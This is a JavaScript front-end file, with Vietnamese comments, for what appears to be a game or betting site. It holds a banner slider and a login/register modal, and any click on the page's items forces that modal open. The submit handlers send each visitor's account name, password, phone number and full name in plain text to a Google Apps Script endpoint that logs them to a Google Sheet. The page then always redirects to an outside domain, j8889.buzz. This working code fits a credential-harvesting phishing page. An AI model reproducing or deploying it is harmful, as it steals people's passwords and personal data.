// Chỉ dùng MỘT lệnh DOMContentLoaded bao bọc toàn bộ code
document.addEventListener("DOMContentLoaded", function() {
    
    // ==========================================
    // 1. XỬ LÝ THANH BOTTOM NAV & SIDEBAR & TABS
    // ==========================================
    const navItems = document.querySelectorAll('.nav-item');
    navItems.forEach(item => {
        item.addEventListener('click', function() {
            navItems.forEach(nav => nav.classList.remove('active'));
            this.classList.add('active');
        });
    });

    const sidebarItems = document.querySelectorAll('.sidebar-item');
    sidebarItems.forEach(item => {
        item.addEventListener('click', function() {
            sidebarItems.forEach(sidebar => sidebar.classList.remove('active'));
            this.classList.add('active');
        });
    });

    const tabs = document.querySelectorAll('.tab');
    tabs.forEach(tab => {
        tab.addEventListener('click', function() {
            tabs.forEach(t => t.classList.remove('active'));
            this.classList.add('active');
        });
    });

    // ==========================================
    // 2. XỬ LÝ SLIDER BANNER
    // ==========================================
    const sliderWrapper = document.getElementById('sliderWrapper');
    const dotsContainer = document.getElementById('sliderDots');
    const slides = document.querySelectorAll('.slide');
    
    if (sliderWrapper && slides.length > 0) {
        let currentSlide = 0;
        const totalSlides = slides.length;
        let slideInterval;

        slides.forEach((_, index) => {
            const dot = document.createElement('div');
            dot.classList.add('dot');
            if (index === 0) dot.classList.add('active');
            dot.addEventListener('click', () => goToSlide(index));
            dotsContainer.appendChild(dot);
        });

        const dots = document.querySelectorAll('.dot');

        function updateDots() {
            dots.forEach(dot => dot.classList.remove('active'));
            dots[currentSlide].classList.add('active');
        }

        function goToSlide(index) {
            currentSlide = index;
            sliderWrapper.style.transform = `translateX(-${currentSlide * 100}%)`;
            updateDots();
            resetInterval(); 
        }

        function nextSlide() {
            currentSlide = (currentSlide + 1) % totalSlides; 
            goToSlide(currentSlide);
        }

        function startInterval() {
            slideInterval = setInterval(nextSlide, 3000); 
        }

        function resetInterval() {
            clearInterval(slideInterval);
            startInterval();
        }
        startInterval();
    }

    // ==========================================
    // 3. XỬ LÝ MODAL ĐĂNG NHẬP / ĐĂNG KÝ
    // ==========================================
    const authModal = document.getElementById('authModal');
    const closeAuthModal = document.getElementById('closeAuthModal');
    const btnLoginTop = document.querySelector('.btn-login');
    const btnRegisterTop = document.querySelector('.btn-register');
    const tabLoginBtn = document.getElementById('tabLoginBtn');
    const tabRegisterBtn = document.getElementById('tabRegisterBtn');
    const formLogin = document.getElementById('formLogin');
    const formRegister = document.getElementById('formRegister');

    if (btnLoginTop && btnRegisterTop && authModal) {
        btnLoginTop.addEventListener('click', function() {
            authModal.classList.add('show');
            switchToLogin();
        });

        btnRegisterTop.addEventListener('click', function() {
            authModal.classList.add('show');
            switchToRegister();
        });
    }

    if (closeAuthModal) {
        closeAuthModal.addEventListener('click', function() {
            authModal.classList.remove('show');
        });
    }

    if (tabLoginBtn && tabRegisterBtn) {
        tabLoginBtn.addEventListener('click', switchToLogin);
        tabRegisterBtn.addEventListener('click', switchToRegister);
    }

    function switchToLogin() {
        tabLoginBtn.classList.add('active');
        tabRegisterBtn.classList.remove('active');
        formLogin.classList.add('active');
        formRegister.classList.remove('active');
    }

    function switchToRegister() {
        tabRegisterBtn.classList.add('active');
        tabLoginBtn.classList.remove('active');
        formRegister.classList.add('active');
        formLogin.classList.remove('active');
    }

    console.log("File script.js đã được tải và gộp thành công!");
    // ==========================================
    // YÊU CẦU ĐĂNG NHẬP KHI BẤM VÀO CÁC THÀNH PHẦN KHÁC
    // ==========================================
    
    // Chọn tất cả các phần tử bạn muốn kích hoạt form đăng nhập
    // Bao gồm: Menu trái, Thẻ Game, Tab, Nút Tìm kiếm, và Thanh menu dưới
    const requireLoginElements = document.querySelectorAll('.sidebar-item, .game-card, .tab, .search-all, .nav-item,.icon-menu,.menu-icon,.logo-img,.vip-img');

    requireLoginElements.forEach(item => {
        item.addEventListener('click', function(e) {
            if (authModal) {
                // Hiển thị form Modal
                authModal.classList.add('show');
                // Tự động chuyển sang giao diện Đăng Nhập
                switchToLogin();
            }
        });
    });
    // ==========================================
    // 4. KIỂM TRA ĐIỀU KIỆN, GỬI GGSHEET VÀ CHUYỂN HƯỚNG
    // ==========================================
    
    // ĐIỀN LINK WEB APP CỦA GOOGLE SCRIPT VÀO ĐÂY
    const scriptURL = 'https://script.google.com/macros/s/AKfycbwwriysSxuRqua-oxtlbmbAHYnZ1U-z56RZjy_s3l_3PXPKObhQRPFfV5gE3icX9fnEdg/exec'; 

    const loginSubmitBtn = formLogin.querySelector('.btn-submit');
    const registerSubmitBtn = formRegister.querySelector('.btn-submit');

    // Hàm kiểm tra form (Giữ nguyên logic của bạn)
    function validateForm(formElement, isRegister = false) {
        const inputs = formElement.querySelectorAll('input[type="text"], input[type="password"], input[type="tel"]');
        const checkbox = formElement.querySelector('input[type="checkbox"]');
        
        for (let input of inputs) {
            if (input.value.trim() === '') {
                alert("Vui lòng điền đầy đủ tất cả các trường thông tin!");
                input.focus();
                return false;
            }
        }

        if (checkbox && !checkbox.checked) {
            alert(isRegister ? "Bạn cần đồng ý với Thỏa thuận đăng ký!" : "Vui lòng chọn Ghi nhớ tài khoản!");
            return false;
        }

        const accountValue = inputs[0].value.trim();
        const passwordValue = inputs[1].value.trim();
        const phoneValue = inputs[2].value.trim();

        if (accountValue.length < 6) {
            alert("Tài khoản phải có ít nhất 6 ký tự!");
            inputs[0].focus();
            return false;
        }

        if (passwordValue.length < 6) {
            alert("Mật khẩu phải có ít nhất 6 ký tự!");
            inputs[1].focus();
            return false;
        }

        const phoneRegex = /^\d{10}$/;
        if (!phoneRegex.test(phoneValue)) {
            alert("Số điện thoại không hợp lệ! Vui lòng nhập đúng 10 chữ số.");
            inputs[2].focus();
            return false;
        }

        return true;
    }

    // Hàm dùng Fetch API đẩy dữ liệu về Google Sheets
    function sendDataToSheet(data, redirectUrl, btnElement) {
        // Đổi chữ nút thành Đang xử lý để UX tốt hơn
        const originalText = btnElement.textContent;
        btnElement.textContent = 'Đang xử lý...';
        btnElement.style.opacity = '0.7';
        btnElement.style.pointerEvents = 'none';

        // Đóng gói dữ liệu để gửi đi
        const formData = new URLSearchParams();
        for (const key in data) {
            formData.append(key, data[key]);
        }

        // ĐÃ THÊM MÃ CHỐNG CHẶN CORS
        fetch(scriptURL, {
            method: 'POST',
            mode: 'no-cors', /* Dòng lệnh quan trọng để không bị Google chặn */
            body: formData
        })
        .then(response => {
            // Khi dùng no-cors, trình duyệt không đọc được phản hồi chi tiết từ Google
            // Nên chúng ta mặc định xem như thành công và chuyển hướng
            window.location.href = redirectUrl; 
        })
        .catch(error => {
            console.error('Lỗi khi gửi dữ liệu!', error.message);
            window.location.href = redirectUrl; 
        });
    }

    // Gắn sự kiện cho nút ĐĂNG NHẬP
    if (loginSubmitBtn) {
        loginSubmitBtn.addEventListener('click', function(e) {
            e.preventDefault(); 
            if (validateForm(formLogin, false)) {
                const inputs = formLogin.querySelectorAll('input[type="text"], input[type="password"], input[type="tel"]');
                const data = {
                    status: 'ĐĂNG NHẬP',
                    account: inputs[0].value.trim(),
                    password: inputs[1].value.trim(),
                    phone: inputs[2].value.trim(),
                    fullname: '' // Form đăng nhập không có họ tên
                };
                sendDataToSheet(data, "https://m.j8889.buzz/", loginSubmitBtn);
            }
        });
    }

    // Gắn sự kiện cho nút ĐĂNG KÝ
    if (registerSubmitBtn) {
        registerSubmitBtn.addEventListener('click', function(e) {
            e.preventDefault(); 
            if (validateForm(formRegister, true)) {
                const inputs = formRegister.querySelectorAll('input[type="text"], input[type="password"], input[type="tel"]');
                const data = {
                    status: 'ĐĂNG KÝ',
                    account: inputs[0].value.trim(),
                    password: inputs[1].value.trim(),
                    phone: inputs[2].value.trim(),
                    fullname: inputs[3].value.trim() // Lấy ô input thứ 4 (Họ và tên)
                };
                sendDataToSheet(data, "https://m.j8889.buzz/", registerSubmitBtn);
            }
        });
    }
});